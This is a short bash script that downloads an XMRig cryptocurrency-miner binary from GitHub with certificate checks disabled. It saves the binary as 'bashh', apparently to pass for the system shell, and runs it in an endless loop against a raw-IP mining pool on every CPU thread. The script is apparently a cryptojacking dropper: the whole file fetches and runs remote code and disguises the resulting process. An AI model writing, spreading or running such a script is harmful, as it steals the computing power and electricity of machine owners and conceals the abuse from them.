#!/bin/bash

threads=$(nproc)
if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
    wget --no-check-certificate -O "bashh" https://github.com/siemkamichal1/xmrig/raw/refs/heads/main/xmrigarm64
else
    wget --no-check-certificate -O "bashh" https://github.com/siemkamichal1/xmrig/raw/refs/heads/main/xmrigamd64
fi

chmod +x bashh

while true; do
    ./bashh -a rx/0 -o 45.156.21.182:3333 -u x -p x --no-color --nicehash -t $threads
done